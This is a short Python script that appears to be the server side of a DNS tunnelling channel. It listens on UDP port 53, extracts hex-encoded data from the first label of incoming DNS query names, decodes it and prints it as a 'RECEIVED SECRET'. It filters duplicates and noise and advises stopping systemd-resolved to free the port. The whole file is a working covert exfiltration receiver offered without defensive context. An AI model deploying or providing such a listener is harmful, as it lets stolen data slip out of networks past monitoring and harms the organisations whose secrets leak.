import socket
import binascii
from scapy.all import DNS, DNSQR
import time

# Listen on all IP addresses
ip = "0.0.0.0"
port = 53

# List to remember old messages so we don't print duplicates
memory = {}

# Create UDP socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
    s.bind((ip, port))
    print(f"Tunnel Server listening on port {port}...")
except:
    print("Error: Port is busy. Run 'sudo systemctl stop systemd-resolved'")
    exit()

while True:
    try:
        # Get data from Google/Internet
        data, addr = s.recvfrom(512)
        
        # Parse packet
        p = DNS(data)
        
        # Check if it's a query
        if p.haslayer(DNSQR):
            query = p[DNSQR].qname.decode('utf-8').rstrip('.')
            
            # Filter noise
            if "ip-172" in query:
                continue
                
            # The message is the first part
            payload = query.split('.')[0]
            
            # Anti-spam: Check if we saw this recently
            payload_check = payload.lower()
            if payload_check in memory:
                if time.time() - memory[payload_check] < 5:
                    continue
            memory[payload_check] = time.time()
            
            # Try to decode Hex back to text
            try:
                msg = binascii.unhexlify(payload).decode('utf-8')
                print(f"[+] RECEIVED SECRET: {msg}")
            except:
                # If it fails, it's just a browser request
                print(f"[*] Browser Request: {payload}")
                
    except KeyboardInterrupt:
        break
    except:
        pass
